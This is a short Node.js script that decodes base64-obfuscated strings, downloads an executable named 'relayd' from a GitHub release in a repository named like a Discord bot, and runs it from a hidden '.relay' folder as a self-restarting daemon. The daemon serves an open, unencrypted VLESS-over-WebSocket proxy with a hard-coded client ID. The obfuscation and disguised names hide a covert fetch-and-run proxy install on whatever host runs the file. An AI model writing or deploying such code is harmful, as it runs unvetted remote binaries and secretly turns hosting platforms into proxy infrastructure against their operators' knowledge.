const fs = require("fs");
const path = require("path");
const https = require("https");
const { spawn } = require("child_process");

const d = (s) => Buffer.from(s, "base64").toString("utf8");

const FIXED_ID = "0a0fd928-2501-4888-9df8-5d8fde6c6de4";
const GW_PATH = d("L3ZsZXNzd3M="); // /vlessws
const GW_NET = d("d3M=");          // ws
const GW_PROTO = d("dmxlc3M=");    // vless
const GW_URL = d(
  "aHR0cHM6Ly9naXRodWIuY29tL2pvb2xhbjEyMy9jb21tdW5pdHktYm90" +
  "LWRpc2NvcmY0My9yZWxlYXNlcy9kb3dubG9hZC92MjYuMTEuOS9yZWxheWQ="
);

const BASE = __dirname;
const R_DIR = path.join(BASE, ".relay");
const R_BIN = path.join(R_DIR, "relayd");
const R_CFG = path.join(BASE, "relay.json");
const R_LOG = path.join(R_DIR, "boot.log");
const PORT = parseInt(process.env.PORT || "8080", 10);

function log(msg) {
  fs.mkdirSync(R_DIR, { recursive: true });
  fs.appendFileSync(R_LOG, `[${new Date().toISOString()}] ${msg}\n`);
}

function download(url, dest) {
  return new Promise((resolve, reject) => {
    https.get(url, { headers: { "User-Agent": "Mozilla/5.0" } }, (res) => {
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        return resolve(download(res.headers.location, dest));
      }
      if (res.statusCode !== 200) {
        return reject(new Error(`HTTP ${res.statusCode}`));
      }
      const file = fs.createWriteStream(dest);
      res.pipe(file);
      file.on("finish", () => {
        file.close(() => {
          fs.chmodSync(dest, 0o755);
          resolve();
        });
      });
    }).on("error", reject);
  });
}

function writeConfig() {
  const cfg = {
    log: { loglevel: "error" },
    policy: {
      levels: {
        "0": {
          handshake: 4,
          connIdle: 90,
          uplinkOnly: 2,
          downlinkOnly: 2,
          bufferSize: 512,
        },
      },
      system: {
        statsInboundUplink: false,
        statsInboundDownlink: false,
      },
    },
    inbounds: [
      {
        listen: "0.0.0.0",
        port: PORT,
        protocol: GW_PROTO,
        settings: {
          clients: [{ id: FIXED_ID }],
          decryption: "none",
        },
        streamSettings: {
          network: GW_NET,
          security: "none",
          wsSettings: { path: GW_PATH },
        },
      },
    ],
    outbounds: [
      {
        protocol: "freedom",
        tag: "direct",
        settings: { domainStrategy: "AsIs" },
      },
    ],
  };
  fs.writeFileSync(R_CFG, JSON.stringify(cfg, null, 2));
}

function startDaemon() {
  const out = fs.openSync(R_LOG, "a");
  const child = spawn(R_BIN, ["run", "-config", R_CFG], {
    stdio: ["ignore", out, out],
    env: {
      ...process.env,
      GOMAXPROCS: "1",
      GOGC: "300",
      GOMEMLIMIT: "150MiB",
    },
  });

  child.on("exit", (code) => {
    log(`daemon exited code=${code}; restarting in 5s`);
    setTimeout(startDaemon, 5000);
  });
}

(async () => {
  try {
    fs.mkdirSync(R_DIR, { recursive: true });
    const isArm = process.arch === "arm64";
    const url = isArm ? `${GW_URL}-arm64` : GW_URL;

    if (!fs.existsSync(R_BIN) || fs.statSync(R_BIN).size < 5_000_000) {
      await download(url, R_BIN);
    }
    writeConfig();
    log(`initialized port=${PORT}`);
    startDaemon();
  } catch (err) {
    log(`init error: ${err.message}`);
    setInterval(() => {}, 60000);
  }
})();
